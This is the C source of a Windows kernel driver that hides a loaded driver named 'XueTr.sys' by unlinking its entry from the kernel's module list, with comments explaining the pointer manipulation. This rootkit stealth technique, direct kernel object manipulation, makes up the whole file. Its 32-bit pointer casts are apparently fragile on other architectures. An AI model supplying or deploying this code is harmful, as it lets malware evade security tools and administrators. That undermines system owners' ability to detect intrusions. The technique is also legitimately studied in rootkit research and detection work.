
#include <ntddk.h>; 

typedef unsigned long DWORD; 

typedef struct _KLDR_DATA_TABLE_ENTRY { 
LIST_ENTRY InLoadOrderLinks; 
PVOID ExceptionTable; 
ULONG ExceptionTableSize; 
PVOID GpValue;
DWORD UnKnow; 
PVOID DllBase; 
PVOID EntryPoint; 
ULONG SizeOfImage; 
UNICODE_STRING FullDllName; 
UNICODE_STRING BaseDllName; 
ULONG Flags; 
USHORT LoadCount; 
USHORT __Unused5; 
PVOID SectionPointer; 
ULONG CheckSum; 
PVOID LoadedImports; 
PVOID PatchInformation; 
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY; 

PDRIVER_OBJECT pDriverObject = NULL; 

VOID  
HideDriver() 
{ 
PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)pDriverObject-&gt;DriverSection; 
PKLDR_DATA_TABLE_ENTRY firstentry; 
UNICODE_STRING uniDriverName; 
   
firstentry = entry; 

// Initialization needs to hide the driver name of the driver


RtlInitUnicodeString(&uniDriverName, L"XueTr.sys");      
while((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != firstentry) 
{ 
         if (entry->FullDllName.Buffer != 0) 
         {     
            if (RtlCompareUnicodeString(&uniDriverName, &(entry->BaseDllName), FALSE) == 0) 
             { 
                 KdPrint(("Hide driver %ws successful!\n", entry->BaseDllName.Buffer));  

// Modify the Flink and Blink pointers to skip what we want

                 *((DWORD*)entry->InLoadOrderLinks.Blink) = (DWORD)entry->InLoadOrderLinks.Flink; 
                 entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink; 
                  
/*
Make the Flink and Blink fields of the hidden driver LIST_ENTRY structure point to yourself
Because this node is originally in the linked list, then its adjacent nodes
The system will point the Flink and Blink domains of this node to the next node of its adjacent node.
However, it has already left the linked list at this time. If its original adjacent node is now
If uninstalled, the Flink and Blink domains of this node may point to useless addresses, and
BSoD causing randomness.
*/
                 
                 entry->InLoadOrderLinks.Flink = (LIST_ENTRY*)&(entry->InLoadOrderLinks.Flink); 
                 entry->InLoadOrderLinks.Blink = (LIST_ENTRY*)&(entry->InLoadOrderLinks.Flink); 
 
                 break; 
             } 
         } 
// Move the linked list forward
         entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink; 
      } 
  } 
   
NTSTATUS  
UnloadDriver( 
             IN PDRIVER_OBJECT DriverObject 
             ) 
{ 
     return STATUS_SUCCESS; 
} 
  
NTSTATUS  
DriverEntry( 
            IN PDRIVER_OBJECT DriverObject,  
            IN PUNICODE_STRING  RegistryPath 
           ) 
{ 
      DriverObject->DriverUnload = UnloadDriver; 
      pDriverObject = DriverObject; 
      HideDriver(); 
      return STATUS_SUCCESS; 
}
